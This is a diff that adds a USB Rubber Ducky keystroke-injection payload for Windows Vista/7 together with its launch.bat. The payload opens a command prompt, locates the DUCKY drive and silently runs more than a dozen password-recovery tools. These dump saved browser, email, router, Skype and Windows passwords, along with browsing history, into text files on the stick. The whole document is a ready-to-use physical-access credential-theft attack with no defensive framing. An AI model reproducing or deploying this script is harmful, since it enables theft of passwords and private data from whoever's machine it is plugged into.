@@ -1,0 +1,40 @@
+ENCODE: 
+
+DEFAULT_DELAY 25
+REM File: MrGraysRubberHacks.txt
+REM Target: WINDOWS VISTA/7
+DELAY 1000
+ESCAPE
+CONTROL ESCAPE
+DELAY 100
+STRING cmd
+DELAY 100
+ENTER
+DELAY 150
+STRING for /f "tokens=3 delims= " %A in ('echo list volume ^| diskpart ^| findstr "DUCKY"') do (set DUCKYdrive=%A:)
+ENTER
+STRING set DUCKYdrive=%DUCKYdrive%\MrGraysRubberHacks
+ENTER
+STRING %DUCKYdrive%\launch.bat
+ENTER
+
+LAUNCH.BAT file: 
+
+for /f "tokens=3 delims= " %%A in ('echo list volume ^| diskpart ^| findstr "DUCKY"') do (set DUCKYdrive=%%A:)
+
+REM Output everything to this folder so I don't have everything on the duck's root. 
+set DUCKYdrive=%DUCKYdrive%\MrGraysRubberHacks
+
+start %DUCKYdrive%\WebBrowserPassView.exe /stext %DUCKYdrive%\WebBrowserPassView.txt
+start %DUCKYdrive%\SkypeLogView.exe /stext %DUCKYdrive%\SkypeLogView.txt
+start %DUCKYdrive%\RouterPassView.exe /stext %DUCKYdrive%\RouterPassView.txt
+start %DUCKYdrive%\pspv.exe /stext %DUCKYdrive%\pspv.txt
+start %DUCKYdrive%\PasswordFox.exe /stext %DUCKYdrive%\PasswordFox.txt
+start %DUCKYdrive%\OperaPassView.exe /stext %DUCKYdrive%\OperaPassView.txt
+start %DUCKYdrive%\mspass.exe /stext %DUCKYdrive%\mspass.txt
+start %DUCKYdrive%\mailpv.exe /stext %DUCKYdrive%\mailpv.txt
+start %DUCKYdrive%\iepv.exe /stext %DUCKYdrive%\iepv.txt
+start %DUCKYdrive%\ChromePass.exe /stext %DUCKYdrive%\ChromePass.txt
+start %DUCKYdrive%\ChromeHistoryView.exe /stext %DUCKYdrive%\ChromeHistoryView.txt
+start %DUCKYdrive%\BulletsPassView.exe /stext %DUCKYdrive%\BulletsPassView.txt
+start %DUCKYdrive%\BrowsingHistoryView.exe /stext %DUCKYdrive%\BrowsingHistoryView.txt
